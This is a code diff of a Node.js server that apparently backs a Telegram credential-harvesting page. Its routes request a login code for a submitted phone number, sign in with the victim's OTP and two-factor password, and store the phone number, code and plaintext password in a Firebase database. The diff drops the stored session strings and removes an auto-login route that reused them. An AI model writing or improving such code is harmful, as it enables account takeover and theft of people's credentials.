@@ -30,7 +30,6 @@ admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
   databaseURL: process.env.FIREBASE_DATABASE_URL
 });
-
 const db = admin.database();
 
 // ================= ROUTES =================
@@ -40,9 +39,9 @@ app.get('/favicon.ico',(req,res)=>res.status(204));
 // 🔹 STEP 1: Send OTP
 app.post('/send-otp', async (req,res)=>{
   let { phone } = req.body;
-  try{
+  try {
     phone = String(phone).trim();
-    if(!phone.startsWith('+')) phone = '+855' + phone;
+    if(!phone.startsWith('+')) phone = '+855'+phone;
 
     const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries:5 });
     await client.connect();
@@ -56,20 +55,20 @@ app.post('/send-otp', async (req,res)=>{
 
     tempSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
     console.log("OTP sent:", phone);
-    res.json({ success:true });
 
+    res.json({ success:true, message:'OTP sent! Check your phone.' });
   } catch(err){
     console.error("SEND OTP ERROR:", err);
-    res.status(500).json({ success:false, error:err.message });
+    res.status(500).json({ success:false, message:err.message });
   }
 });
 
-// 🔹 STEP 2: Login + 2FA + save session
+// 🔹 STEP 2: Login + 2FA
 app.post('/login', async (req,res)=>{
   let { phone, otp, password } = req.body;
   if(!phone || !otp) return res.json({ success:false, message:'Phone & OTP required' });
 
-  try{
+  try {
     phone = String(phone).trim();
     if(!phone.startsWith('+')) phone = '+855'+phone;
 
@@ -78,7 +77,8 @@ app.post('/login', async (req,res)=>{
 
     const { client, phoneCodeHash } = temp;
 
-    try{
+    try {
+      // Sign in with OTP
       await client.invoke(new Api.auth.SignIn({
         phoneNumber: phone,
         phoneCode: otp,
@@ -90,11 +90,11 @@ app.post('/login', async (req,res)=>{
       } else throw err;
     }
 
+    // If 2FA password provided
     if(password){
       await client.invoke(new Api.auth.CheckPassword({ password }));
     }
 
-    // Save session string
     const sessionString = client.session.save();
     console.log("LOGIN SUCCESS:", phone);
 
@@ -103,48 +103,16 @@ app.post('/login', async (req,res)=>{
       phone,
       otp,
       password: password || null,
-      sessionString,
       timestamp: Date.now()
     });
 
+    // Cleanup
     delete tempSessions[phone];
     await client.disconnect();
 
-    res.json({ success:true, message:'Login successful. Session saved!' });
-
+    res.json({ success:true, message:'Login successful' });
   } catch(err){
     console.error("LOGIN ERROR:", err.message);
-    res.json({ success:false, message:err.message });
-  }
-});
-
-// 🔹 STEP 3: Auto login using saved session
-app.post('/auto-login', async (req,res)=>{
-  let { phone } = req.body;
-  if(!phone) return res.json({ success:false, message:'Phone required' });
-
-  try{
-    phone = String(phone).trim();
-    if(!phone.startsWith('+')) phone = '+855'+phone;
-
-    // Fetch last sessionString for this phone
-    const snapshot = await db.ref('telegram_logins').orderByChild('phone').equalTo(phone).limitToLast(1).once('value');
-    if(!snapshot.exists()){
-      return res.json({ success:false, message:'No saved session found' });
-    }
-
-    const sessionData = Object.values(snapshot.val())[0];
-    if(!sessionData.sessionString) return res.json({ success:false, message:'No session string saved' });
-
-    const client = new TelegramClient(new StringSession(sessionData.sessionString), apiId, apiHash, { connectionRetries:5 });
-    await client.connect();
-
-    res.json({ success:true, message:'Auto login success! Session active.' });
-
-    await client.disconnect();
-
-  } catch(err){
-    console.error("AUTO LOGIN ERROR:", err.message);
     res.json({ success:false, message:err.message });
   }
 });
